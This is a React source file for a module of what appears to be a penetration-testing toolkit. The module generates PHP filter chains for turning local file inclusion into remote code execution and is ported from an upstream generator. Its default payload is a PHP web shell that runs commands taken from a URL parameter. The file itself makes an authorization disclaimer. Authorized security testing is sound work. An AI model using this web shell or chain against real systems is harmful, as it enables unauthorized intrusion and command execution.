import { useMemo, useState } from 'react';
import { ExternalLink, ShieldAlert } from 'lucide-react';
import { ModuleHeader } from '@/components/shell/ModuleHeader';
import { CopyButton } from '@/components/shell/CopyButton';
import { Textarea } from '@/components/ui/textarea';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Switch } from '@/components/ui/switch';
import { Card, CardContent } from '@/components/ui/card';
import { buildPhpFilterChainFromPayload, buildPhpFilterChainFromBase64 } from '@/lib/phpfilterchain';
import type { ModuleComponentProps } from '@/types';

export function PHPFilterChain({ onBack }: ModuleComponentProps) {
  const [payload, setPayload] = useState('<?=system($_GET[0]);?>');
  const [rawMode, setRawMode] = useState(false);
  const [rawBase64, setRawBase64] = useState('');

  const result = useMemo(() => {
    try {
      if (rawMode) {
        if (!rawBase64.trim()) return null;
        return { ok: true as const, value: buildPhpFilterChainFromBase64(rawBase64.trim()) };
      }
      if (!payload) return null;
      return { ok: true as const, value: buildPhpFilterChainFromPayload(payload) };
    } catch (err) {
      return { ok: false as const, error: err instanceof Error ? err.message : String(err) };
    }
  }, [payload, rawMode, rawBase64]);

  return (
    <div className="flex flex-col">
      <ModuleHeader
        title="PHPFilterChain"
        description="Generates a php://filter conversion chain that reproduces arbitrary text, for LFI-to-RCE style testing. Generation only."
        onBack={onBack}
      />
      <div className="flex flex-col gap-3 p-3">
        <div className="flex items-start gap-2 rounded-md border border-warning/30 bg-warning/10 p-2 text-[11px] text-warning">
          <ShieldAlert className="size-3.5 shrink-0" />
          <p>
            BugEye only generates this string. You are responsible for where you submit it and for
            having authorization to test the target. Verify against a real PHP instance before relying
            on it, iconv behavior can vary slightly across builds.
          </p>
        </div>

        <a
          href="https://github.com/synacktiv/php_filter_chain_generator"
          target="_blank"
          rel="noreferrer"
          className="flex w-fit items-center gap-1 text-[11px] text-primary hover:underline"
        >
          <ExternalLink className="size-3" /> synacktiv/php_filter_chain_generator (upstream tool this ports)
        </a>

        <div className="flex items-center gap-2">
          <Label className="text-muted-foreground">Debug mode (raw base64 input, output not decoded)</Label>
          <Switch checked={rawMode} onCheckedChange={setRawMode} />
        </div>

        {rawMode ? (
          <div className="flex flex-col gap-1.5">
            <Label className="text-muted-foreground">Raw base64 string</Label>
            <Input value={rawBase64} onChange={(e) => setRawBase64(e.target.value)} placeholder="PD9waHAg..." />
          </div>
        ) : (
          <div className="flex flex-col gap-1.5">
            <Label className="text-muted-foreground">Target PHP payload</Label>
            <Textarea
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              placeholder="<?=system($_GET[0]);?>"
              className="min-h-20 font-mono"
            />
          </div>
        )}

        {result && !result.ok && <p className="text-xs text-destructive">{result.error}</p>}

        {result?.ok && (
          <Card>
            <CardContent className="flex flex-col gap-3 p-3">
              <div>
                <p className="mb-1 text-xs font-medium">Base64 of target payload</p>
                <div className="flex items-center gap-2">
                  <code className="min-w-0 flex-1 truncate rounded bg-muted p-2 text-[11px]">
                    {result.value.base64}
                  </code>
                  <CopyButton text={result.value.base64} label="" className="shrink-0 px-2" />
                </div>
              </div>
              <div>
                <p className="mb-1 text-xs font-medium">Filter chain</p>
                <pre className="whitespace-pre-wrap break-all rounded bg-muted p-2 text-[11px]">
                  {result.value.chain}
                </pre>
                <CopyButton text={result.value.chain} label="Copy chain" className="mt-2" />
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
}

export default PHPFilterChain;
